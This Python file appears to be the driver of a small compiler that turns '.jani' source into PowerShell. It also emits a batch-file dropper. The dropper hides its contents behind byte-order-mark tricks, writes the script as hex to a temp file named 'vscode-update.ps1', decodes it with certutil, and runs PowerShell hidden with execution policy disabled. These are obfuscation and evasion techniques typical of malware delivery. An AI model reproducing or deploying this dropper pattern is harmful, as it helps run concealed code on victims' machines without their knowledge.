import os
import sys
import colored

from lang.lexer import Lexer, LexerError
from lang.parser import Parser, ParserError
from lang.builder import Builder, BuilderError

def runFile(path: str):
    with open(path, "rb") as f:
        c = f.read()

    try:
        lexed = Lexer(c).run()
        parsed = Parser(lexed, path).run()
        return Builder(parsed, path).run()
    except LexerError as e:
        print(f"{colored.fore_rgb(215, 20, 25)}{colored.Style.BOLD}LexerError:{colored.Style.RESET} {e!s}")
        raise e
    except ParserError as e:
        print(f"{colored.fore_rgb(215, 20, 25)}{colored.Style.BOLD}ParserError:{colored.Style.RESET} {e!s}")
        raise e
    except BuilderError as e:
        print(f"{colored.fore_rgb(215, 20, 25)}{colored.Style.BOLD}BuilderError:{colored.Style.RESET} {e!s}")
        raise e

def main():
    if len(sys.argv) < 3:
        print("usage: jani [input] [output directory]")
        sys.exit(0)

    path = os.path.normpath(sys.argv[1])
    if not os.path.isfile(path):
        print("ERROR: given input path does not represent a file. please make sure it's correct.")
        sys.exit(1)

    output = os.path.normpath(sys.argv[2])
    if os.path.isfile(output):
        print("ERROR: given output path represents a file. please delete it or change the output directory.")
        sys.exit(1)
    elif not os.path.exists(output):
        os.mkdir(output)
    elif not os.path.isdir(output):
        print("ERROR: given output path represents a stream. please delete it or change the output directory.")
        sys.exit(1)

    ps = runFile(path).encode(errors='surrogatepass')
    fn = path.replace("\\", "/").split("/")[-1].removesuffix(".jani")

    with open(output + "/%s.ps1" % fn, "wb") as f:
        f.write(ps)

    with open(output + "/%s.bat" % fn, "wb") as f:
        f.write(b"".join(bytes.fromhex(b) for b in ("FF", "FE", "26", "63", "6C", "73", "0D", "0A", "FF", "FE", "0A", "0D")))

        script =  f"@echo off\n"
        script += f"cls\n"
        script += f"set i=%TEMP%\\vscode-update.ps1\n"

        psHex = ps.hex(' ')

        for i, ch in enumerate(psHex):
            if i % 90 == 0:
                if i == 90:
                    script += f"> %i%\n"
                elif i > 0:
                    script += f">> %i%\n"
                script += "echo "

            script += ch

        script += f" >> %i%\n"

        script += f"certutil -f -decodehex %i% %i% >nul\n"
        script += f"start /min powershell -NoProfile -Mta -NoLogo -ExecutionPolicy Unrestricted -WindowStyle Hidden -File %i%"

        script = script.encode('cp437', 'surrogatepass')
        f.write(b''.join(bytes.fromhex('%02X' % b) for b in script))

if __name__ == '__main__':
    main()
